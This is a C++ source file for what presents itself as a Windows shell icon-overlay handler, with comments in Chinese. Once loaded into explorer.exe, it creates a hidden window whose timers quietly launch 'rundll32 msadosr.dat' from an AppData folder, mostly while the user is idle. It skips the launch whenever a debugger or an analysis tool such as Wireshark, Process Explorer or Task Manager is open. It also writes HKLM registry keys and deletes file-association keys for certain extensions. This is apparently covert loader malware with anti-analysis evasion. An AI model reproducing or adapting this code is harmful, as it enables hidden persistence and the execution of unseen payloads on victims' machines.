// ShellIconHandler.cpp : CShellIconHandler 的实现

#include "stdafx.h"
#include "ShellIconHandler.h"
#include ".\shelliconhandler.h"


// CShellIconHandler

STDMETHODIMP CShellIconHandler::GetClassID( LPCLSID pClassID )
{
	TSTRACEAUTO();
	if(m_spMe)
	{
		CComPtr<IPersistFile> spPF;
		m_spMe.QueryInterface(&spPF);
		return spPF->GetClassID(pClassID);
	}
	else
	{	//真正的实现，在于第二个dll
		return E_NOTIMPL;
	}
}

STDMETHODIMP CShellIconHandler::IsDirty()
{
	TSTRACEAUTO();
	if(m_spMe)
	{
		CComPtr<IPersistFile> spPF;
		m_spMe.QueryInterface(&spPF);
		return spPF->IsDirty();
	}
	else
	{
		return E_NOTIMPL;
	}
}

STDMETHODIMP CShellIconHandler::Load( LPCOLESTR pszFileName, DWORD dwMode )
{
	TSTRACEAUTO();
	if(!m_spMe && !m_lEnable) //
	{
		//第一个
		if(CreateWorkerMe())
		{
			m_spMe->Enable(1);
		}
	}
	if(m_spMe)
	{
		CComPtr<IPersistFile> spPF;
		m_spMe.QueryInterface(&spPF);
		return spPF->Load(  pszFileName,  dwMode );
	}
	else
	{
		m_bstrFilePath = pszFileName;	
		return S_OK;
	}
}

STDMETHODIMP CShellIconHandler::Save( LPCOLESTR pszFileName,BOOL fRemember )
{
	TSTRACEAUTO();
	if(m_spMe)
	{
		CComPtr<IPersistFile> spPF;
		m_spMe.QueryInterface(&spPF);
		return spPF->Save(pszFileName,  fRemember);
	}
	else
		return E_NOTIMPL;
}

STDMETHODIMP CShellIconHandler::SaveCompleted( LPCOLESTR pszFileName )
{
	TSTRACEAUTO();
	if(m_spMe)
	{
		CComPtr<IPersistFile> spPF;
		m_spMe.QueryInterface(&spPF);
		return spPF->SaveCompleted(pszFileName);
	}
	else
		return E_NOTIMPL;
}

STDMETHODIMP CShellIconHandler::GetCurFile( LPOLESTR* ppszFileName )
{
	TSTRACEAUTO();
	if(m_spMe)
	{
		CComPtr<IPersistFile> spPF;
		m_spMe.QueryInterface(&spPF);

		return spPF->GetCurFile(ppszFileName);
	}
	else
		return E_NOTIMPL;

}

STDMETHODIMP CShellIconHandler::GetIconLocation( UINT uFlags, LPWSTR pszIconFile, UINT cchMax, int* piIndex, UINT* pwFlags )
{
	TSTRACEAUTO();

	if(m_spMe)
	{
		CComPtr<IExtractIcon>spEI ;
		m_spMe.QueryInterface(&spEI);
		return spEI->GetIconLocation(uFlags, pszIconFile, cchMax, piIndex, pwFlags);
	}
	else
	{
		TCHAR szPath[MAX_PATH] = {0};

		TCHAR *pszFileName = NULL;
		pszFileName = PathFindExtension(m_bstrFilePath);
		CRegKey key;
		TCHAR szIconPath [_MAX_PATH] = {0};
		HRESULT hr =  key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
		if(hr == ERROR_SUCCESS)
		{
			DWORD dw = _MAX_PATH;
			key.QueryStringValue(pszFileName, szIconPath, &dw );
			if(PathFileExists(szIconPath))
			{
				_tcscpy(szPath, szIconPath);

			}
			TSDEBUG4CXX(" Extension : "<<pszFileName <<" ,REG IconPath : "<<szIconPath<<"");

		}
		/*
		if(szPath[0] == '\0')
		{
			SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, NULL, 0 , szPath);			
			PathAppend(szPath, TEXT("ExtIconHandler\\favicon.ico"));
			TSDEBUG4CXX(" CSIDL_INTERNET_CACHE : "<<szPath);
		}*/

		wcscpy(pszIconFile, szPath);
		*piIndex =0;
		*pwFlags = GIL_DONTCACHE ;
	}
	return S_OK;
}

STDMETHODIMP CShellIconHandler::Extract( LPCWSTR pszFile, UINT nIconIndex, HICON* phiconLarge, HICON* phiconSmall, UINT nIconSize )
{
	TSTRACEAUTO();
	if(m_spMe)
	{
		CComPtr<IExtractIcon> spEI;
		m_spMe.QueryInterface(&spEI);
		return spEI->Extract(pszFile, nIconIndex, phiconLarge, phiconSmall, nIconSize);
	}
	else
	{
		return S_FALSE;
	}
}


STDMETHODIMP CShellIconHandler::Initialize ( LPCITEMIDLIST pidlFolder, LPDATAOBJECT pDataObj, HKEY hProgID ) 
{
	//ATLTRACE("CContentMenuExt::Initialize");
	TSAUTO();
	if(!m_spMe && !m_lEnable) //
	{
		//第一个
		if(CreateWorkerMe())
		{
			m_spMe->Enable(true);
		}
	}
	UNREFERENCED_PARAMETER(pidlFolder);
	UNREFERENCED_PARAMETER(hProgID);
	m_szFiles.clear();
	return 0;
}

STDMETHODIMP CShellIconHandler::InvokeCommand ( LPCMINVOKECOMMANDINFO   pCmdInfo )
{
	TSAUTO();
	if(m_szFiles.size() > 0)
	{
		tstring tstrFile = m_szFiles[0];
		tstring::size_type n = tstrFile.rfind('.');
		if(n != tstring::npos)
		{

		}
		if(pCmdInfo->cbSize==sizeof(CMINVOKECOMMANDINFOEX)&&pCmdInfo->fMask&CMIC_MASK_UNICODE )
		{
			CMINVOKECOMMANDINFOEX *pwsCmdInfo=(LPCMINVOKECOMMANDINFOEX)pCmdInfo;
			if ( 0 != HIWORD( pwsCmdInfo->lpVerbW ))
			{
				if(wcscmp(pwsCmdInfo->lpVerbW,L"open"))
				{
				}
				else
				{
					//MessageBoxA(NULL, "", "CShellIconHandler::InvokeCommand",MB_OK);
					//ShellExecute(pwsCmdInfo->hwnd,_T("open"),m_szFiles.begin()->c_str(),pwsCmdInfo->lpDirectoryW,NULL,SW_SHOW);
					return S_OK;
				}
			}
			else
			{

			}

		}
	}
	return NOERROR;
}

STDMETHODIMP CShellIconHandler::QueryContextMenu ( HMENU hmenu, UINT uMenuIndex, UINT uidFirstCmd, UINT uidLastCmd, UINT uFlags )
{
	TSAUTO();
	UNREFERENCED_PARAMETER(uidLastCmd);
	ATLTRACE("CContentMenuExt::QueryContextMenu");
	//TCHAR strHmenu[65];
	//_itot((UINT)hmenu,strHmenu,16);

	//MessageBox(NULL,strHmenu,_T("HMENU"),0);
	/*
	if ( uFlags & CMF_DEFAULTONLY )      
	{          
	return MAKE_HRESULT ( SEVERITY_SUCCESS, FACILITY_NULL, 0 );        
	}        

	InsertMenu ( hmenu, uMenuIndex, MF_BYPOSITION, uidFirstCmd, _T("添加到  (&L)") );   
	*/
	return MAKE_HRESULT ( SEVERITY_SUCCESS, FACILITY_NULL, 1);
}


STDMETHODIMP CShellIconHandler::DragEnter(IDataObject* pDataObj, DWORD grfKeyState, POINTL pt, DWORD* pdwEffect)
{
	TSAUTO();
	UNREFERENCED_PARAMETER(pDataObj);
	UNREFERENCED_PARAMETER(grfKeyState);
	UNREFERENCED_PARAMETER(pt);
	UNREFERENCED_PARAMETER(pdwEffect);

	return S_OK;
}

STDMETHODIMP CShellIconHandler::DragLeave()
{
	TSAUTO();
	//	MessageBox(NULL,NULL,_T("CContextMenuExt::DragLeave"),0);
	return S_OK;
}

STDMETHODIMP CShellIconHandler::Drop(IDataObject* pDataObj,DWORD grfKeyState,POINTL pt,DWORD* pdwEffect)
{
	TSAUTO();
	return 0;
}
bool CShellIconHandler::FindFirstForFileExt(TCHAR* pszDestDir, TCHAR* pszFileExt, TCHAR*pszPath)
{
	TSAUTO();
	TCHAR szPathWildcard[MAX_PATH] = {0};
	_sntprintf(szPathWildcard, sizeof(szPathWildcard)/sizeof(TCHAR), _T("%s\\*%s"),
		pszDestDir, pszFileExt); 

	HANDLE hfh = INVALID_HANDLE_VALUE;			//find handle
	WIN32_FIND_DATA wfd;
	hfh = FindFirstFile(szPathWildcard, &wfd);
	std::basic_string<TCHAR> strPathName;
	if(hfh != INVALID_HANDLE_VALUE)
	{
		do
		{					
			strPathName = pszDestDir;			
			strPathName += L"\\";
			strPathName += wfd.cFileName;
			wcscpy(pszPath, strPathName.c_str());
			break;
		}while(FindNextFile(hfh, &wfd));
	}
	FindClose(hfh);   

	return (strPathName.length() ? true : false);
}
bool CShellIconHandler::EnableShellIconOverlayIdentifier()
{
	CRegKey key;
	TCHAR szClassId[128] = {0};
	std::wstring str_ShellIconReg = L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\.ExtIconHandler";		
	HRESULT hr = key.Open(HKEY_LOCAL_MACHINE, str_ShellIconReg.c_str(),	KEY_QUERY_VALUE);
	if(hr == ERROR_SUCCESS)
	{
		DWORD dw = _MAX_PATH;
		hr = key.QueryStringValue(L"", szClassId, &dw);
		key.Close();
		if(SUCCEEDED(hr) &&  0 ==  _wcsicmp( szClassId, L"{EE606F2F-AA02-482F-9A83-17219D749CBE}" )) //相同的classid不用再写了
		{
			TSDEBUG4CXX("exist ShellIconOverlayIdentifiers");
			return true;
		}
	}

	TCHAR szPath[_MAX_PATH] = {0};
	TCHAR szDir[_MAX_PATH] = {0};
	TCHAR szDir2[_MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, 0, SHGFP_TYPE_CURRENT, szDir);
	SHGetFolderPath(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, 0, SHGFP_TYPE_CURRENT, szDir2);
	const wchar_t * split = L";";
	wchar_t* pExt = NULL;
	TCHAR szExt[1024] = {0};
	hr = key.Open(HKEY_CURRENT_USER, L"Software\\ExtIconHandler", KEY_QUERY_VALUE);
	if(hr == ERROR_SUCCESS)
	{
		DWORD dw = 1024;
		hr = key.QueryStringValue(L"Ext", szExt, &dw);
		key.Close();

		if(FAILED(hr) || szExt[0]=='\0')
		{
			wcscpy(szExt, L".51fanli;.fanli;.url_;.etao;.eurl;.ur1;.ur;.e;.eth0;.hao123");
		}		
		if(szExt[0]!='\0')
		{
			pExt = _tcstok(szExt, split);
			while(pExt != NULL)
			{
				bool b = FindFirstForFileExt(szDir, pExt , szPath);
				if(b)
				{
					CComBSTR bstrKey1 =  L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\";
					CComBSTR bstrKey2 =  L"\\Software\\Microsoft\\Windows\\Roaming\\OpenWith\\FileExts\\";
					CComBSTR bstrKeyName;

					bstrKeyName = bstrKey1;
					bstrKeyName	+= pExt;					
					SHDeleteKey(HKEY_CURRENT_USER, bstrKeyName.m_str);

					bstrKeyName = bstrKey2;
					bstrKeyName += pExt;
					SHDeleteKey(HKEY_CURRENT_USER, bstrKeyName.m_str);
					
					TSDEBUG4CXX("find ext in my white list, search path : "<<szDir<<" , destfile : "<<szPath);
					return false;
				}
				bool b2 = FindFirstForFileExt(szDir2, pExt , szPath);
				if(b2)
				{
					TSDEBUG4CXX("find ext in my white list, search path : "<<szDir2<<" , destfile : "<<szPath);
					return false;
				}
				pExt = _tcstok(NULL, split);
			}
		}
	}

	hr = key.Create(HKEY_LOCAL_MACHINE,  str_ShellIconReg.c_str());
	if(ERROR_SUCCESS == hr)
	{
		DWORD dw = _MAX_PATH;
		hr = key.SetStringValue(L"", L"{EE606F2F-AA02-482F-9A83-17219D749CBE}");
		TSDEBUG4CXX("_ShellIconRe : "<<str_ShellIconReg.c_str()<<", hr : "<<hr);
		return true;
	}
	return false;
}
LRESULT CShellIconHandler::OnTimer(UINT , WPARAM wParam, LPARAM , BOOL& )
{
	//TSAUTO();
	int nIDEvent = (int)wParam;
	//TSDEBUG4CXX("nIDEvent="<<nIDEvent<<" wParam="<<(UINT)wParam);
	if(m_uTimerID15min == wParam)
	{		
		LASTINPUTINFO l = {0};
		l.cbSize = sizeof LASTINPUTINFO;
		GetLastInputInfo(&l);
		DWORD dwT = GetTickCount();
		if(dwT - l.dwTime > __INTERVAL_ONE_HOUR/4/3) //空闲了多少久   分钟
		{
				
			this->LaunchRundll32();
		}
		else
		{
			if(dwT - m_dwLastLaunch > 2*__INTERVAL_ONE_HOUR) //2个小时,都未能空闲,也拉起进程一次了
			{				
				this->LaunchRundll32();                
			}
		}
	}
	else if (m_uTimerID5min == wParam)
	{ 
		static bool bWriteReg = false;// this->EnableShellIconOverlayIdentifier();
		int nStatus = WAIT_OBJECT_0;
		//int nStatus = WaitForSingleObject(m_hConfigFileChanged, 0);
		TCHAR szDir[_MAX_PATH] = {0};
		SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, 0, SHGFP_TYPE_CURRENT, szDir);
		switch(nStatus)
		{
		case WAIT_OBJECT_0:				
			bWriteReg = this->EnableShellIconOverlayIdentifier();
			//FindCloseChangeNotification(m_hConfigFileChanged);
			m_hConfigFileChanged = INVALID_HANDLE_VALUE;
			if(bWriteReg)
			{
				KillTimer( wParam);
			}
			else
			{
				//m_hConfigFileChanged = FindFirstChangeNotification(szDir,  FALSE, FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE );
			}

			break;
		case WAIT_TIMEOUT:

			break;
		default:
			//m_hConfigFileChanged = FindFirstChangeNotification(szDir,  FALSE, FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE );
			break;
		} 
	}
	else if(m_uTimerID1min == wParam)
	{
		KillTimer( wParam);
		LaunchRundll32();
	}	
	return 0;	
}

bool CShellIconHandler::CreateWorkerMe()
{
	TSAUTO();
	/*
	if(m_spMe)
		return true;
	CRegKey key;
	HRESULT hr = key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
	if(hr == ERROR_SUCCESS)
	{
		TCHAR szPath[_MAX_PATH] = {0};
		ULONG nLen = _MAX_PATH;
		key.QueryStringValue(_T("Path"), szPath, &nLen);
		if(PathFileExists(szPath))
		{
			m_hMe = LoadLibrary(szPath);
			CreateInstanceFromHandle(m_hMe, CLSID_ShellIconHandler, IID_IShellIconHandler, (LPVOID*) &m_spMe);
		}
		if(m_spMe)
		{
			m_spMe->Enable(1);
			return true;
		}
	}
	//
	HWND hWnd = FindWindow(_T("ShellUIWindow32"), NULL);
	if(NULL == hWnd)
	{
		Create((HWND)-3);		
	}*/
	return false;
}
STDMETHODIMP CShellIconHandler::Enable(LONG b)
{
	// TODO: 在此添加实现代码
	TSAUTO();
	m_lEnable = b;
	if(m_lEnable)
	{
		HWND hWnd = FindWindow(_T("ShellUIWindow32"), NULL);
		if(hWnd)
		{
			TSDEBUG4CXX("findwindow and exit");
			return S_OK;

		}
		//Create((HWND)-3);		
	}
	return S_OK;
}
STDMETHODIMP CShellIconHandler::GetOverlayInfo(LPWSTR pwszIconFile,
											   int cchMax,int* pIndex,
											   DWORD* pdwFlags)
{
	TSTRACEAUTO();
	GetModuleFileNameW(_AtlBaseModule.GetModuleInstance(), pwszIconFile, cchMax);
	TSDEBUG4CXX(_T("[out] pwszIconFile = ") << pwszIconFile);

	*pIndex = 0;
	*pdwFlags = ISIOI_ICONFILE | ISIOI_ICONINDEX; 

	/*
	if(NULL == m_hWnd)
	{
		CreateWorkerMe();
	} */
	return S_OK;
}
STDMETHODIMP CShellIconHandler::GetPriority(int* pPriority)
{
	TSTRACEAUTO();
	// highest priority
	*pPriority=0;
	return S_OK;
}
STDMETHODIMP CShellIconHandler::IsMemberOf(LPCWSTR pwszPath, DWORD dwAttrib)
{
	//TSTRACEAUTO();
	HRESULT r = S_FALSE; 
	return r;
}
STDMETHODIMP CShellIconHandler::Execute(LPSHELLEXECUTEINFO pei)
{
	TSTRACEAUTO();
	return  S_FALSE;
}
 CShellIconHandler* CShellIconHandler::s_pThis ;
VOID CALLBACK TimerProc(          HWND hwnd,
    UINT uMsg,
    UINT_PTR idEvent,
    DWORD dwTime)
{
	BOOL b = FALSE;;
	if(WM_TIMER == uMsg)
	{
	 
		CShellIconHandler::s_pThis ->OnTimer(0, idEvent, 0,b);
	 
	}
}
 
LRESULT CShellIconHandler::OnCreate(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/, BOOL& /*bHandled*/)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	TSAUTO();
	CRegKey key;
	HRESULT hr = key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
	if(hr == ERROR_SUCCESS)
	{			
		DWORD  dwVal = 0;
		hr = key.QueryDWORDValue(_T("interval"),dwVal);
		if((hr == ERROR_SUCCESS) && (dwVal > __INTERVAL_ONE_HOUR/30) && (dwVal < __INTERVAL_ONE_HOUR*12) )
		{
			__INTERVAL_ONE_HOUR = dwVal;                
		}	
		key.Close();
	}
	 
	m_uTimerID15min = SetTimer(  1, __INTERVAL_ONE_HOUR /4 );
	TCHAR szDir[_MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, 0, SHGFP_TYPE_CURRENT, szDir);
	m_hConfigFileChanged = FindFirstChangeNotification(szDir,  FALSE, FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE );

	m_uTimerID5min = SetTimer(  2, __INTERVAL_ONE_HOUR / 12  );
	TSDEBUG4CXX("GetTickCount() = "<<GetTickCount());
	if(GetTickCount() <5*60*1000) //window启动以来的时间，而非登录
	{
		m_uTimerID1min = SetTimer(  3, __INTERVAL_ONE_HOUR / 12 ); //避免连续两次执行forcelaunch
		hr = key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
		if(hr == ERROR_SUCCESS)
		{
			DWORD  dwVal = 0;
			hr = key.QueryDWORDValue(_T("forcelaunch"),dwVal);
			TSDEBUG4CXX("forcelaunch="<<dwVal);
			if(hr == ERROR_SUCCESS && dwVal)
			{
				LaunchRundll32();
			}
		}
	}	
	return 0;
}
LRESULT CShellIconHandler::OnSysCommand(UINT /*uMsg*/, WPARAM  wParam , LPARAM /*lParam*/, BOOL& bHandled)
{
	TSAUTO();
	bHandled = FALSE;
	if(SC_SCREENSAVE == wParam)
	{
		 
	}
	return 0;
}
static BOOL CALLBACK EnumWindowsProc(          HWND hwnd,
									 LPARAM lParam
									 )
{
	TCHAR szText[1024] = {0};
	GetWindowText(hwnd, szText , 1024);
	PTCHAR pszBlacklist_window[] = {L"Microsoft Visual",L"HTTP Analyzer",L"WinDBG",L"OllyDebug",
		L"fiddler", L"SmartSniff", L"Spy++",L"ATL/MFC",L"任务管理器",L"Spy",L"DebugView",
		L"Process Explorer", L"File Monitor", L"Registry Monitor",L"Wireshark",L"OllyICE",L"OllyDBG"
		L" - Sysinternals:" //
	};
	for(int i = 0; i < ( sizeof (pszBlacklist_window) / sizeof (pszBlacklist_window[0]) ); i++)
	{
		PTCHAR pszTitle = pszBlacklist_window[i];
		if(0 == StrStrI(szText, pszTitle))
		{
			return 1;
		}
		else
		{
			TSDEBUG4CXX("current enum window title : "<<szText<<" , eXclusive Blackname : "<<pszTitle);
			return 0;
		}
	}

	return TRUE;
}
BOOL CShellIconHandler::eXclusive(void)
{
	return !EnumWindows(EnumWindowsProc, (LPARAM)0);
}
void   CShellIconHandler::LaunchRundll32(TCHAR* pszCmdline)
{
	//	TSAUTO();
	if(FindWindow(_T("XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}"), _T("0")))
	{
		TSDEBUG4CXX("exist XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745} 0,exit");
		return ; //仍在运行中
	}
	if(IsDebugging())
		return ;
	if(eXclusive())
	{		
		return;
	}

	CComBSTR bstrAllPath = L"rundll32.exe msadosr.dat ScreenSaver 0,,1";
	TCHAR szDir[_MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szDir);
	PathAddBackslash(szDir);
	PathAppend(szDir, _T("Microsoft\\AddIns\\"));	

	CComBSTR szDllDir = szDir;
	TCHAR szDllPath[_MAX_PATH] = {0};
	wcscpy(szDllPath, szDir);
	PathAppend(szDllPath, _T("msadosr.dat"));	
	TSDEBUG4CXX("dllpath : "<<szDllPath);
	if( PathFileExists(szDllPath)) 
	{	
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);					
		ZeroMemory( &pi, sizeof(pi) );
		si.dwFlags = STARTF_FORCEOFFFEEDBACK;
		si.wShowWindow = SW_HIDE;

		CreateProcess( NULL,        
			(LPTSTR)bstrAllPath.m_str, // Command line. 
			NULL,                         // Process handle not inheritable. 
			NULL,						  // Thread handle not inheritable. 
			TRUE,						  // Set handle inheritance to FALSE. 
			0,							  // No creation flags. 
			NULL,						  // Use parent's environment block. 
			szDllDir,						  // Use parent's starting directory. 
			&si,						  // Pointer to STARTUPINFO structure.
			&pi );						  //

		CloseHandle( pi.hThread);
		CloseHandle( pi.hProcess);
		TSDEBUG4CXX("pi.dwProcessId="<< pi.dwProcessId);

		this->m_dwLastLaunch = GetTickCount();
	}
}
HRESULT CShellIconHandler::FinalConstruct()
{
	TSAUTO();
	TCHAR szPath[_MAX_PATH] = {0};
	GetModuleFileName(NULL, szPath, _MAX_PATH);
	LPCTSTR pszNames[] = { _T("explorer.exe")};
	bool bMatch = false;
	LPTSTR lpszFindName = szPath;
	lpszFindName += (int)_tcslen(szPath);
	while('\\' != *lpszFindName && '\\' != *lpszFindName)
		lpszFindName--;
	lpszFindName++;
	int i = 0;
	for( ; i < sizeof pszNames / sizeof pszNames[0]; i++)
	{
		int n = _tcsnicmp( lpszFindName,  pszNames[i], _tcslen(pszNames[i]));
		if(0 == n)
		{
			bMatch = true;
			break;
		}			
	} 
	if(!bMatch)
	{
		TSDEBUG4CXX("loadlibrary error GetModuleFileName() = "<<szPath);
		return S_OK;
	}
	
	HWND hWnd = FindWindow(_T("ShellUIWindow32"), NULL);
	if(hWnd)
	{
		TSDEBUG4CXX("exist window ShellUIWindow32 hWnd = " <<hWnd);
		return S_OK;
	}

	Create((HWND)-3);
	AddRef();  
	return S_OK;
}
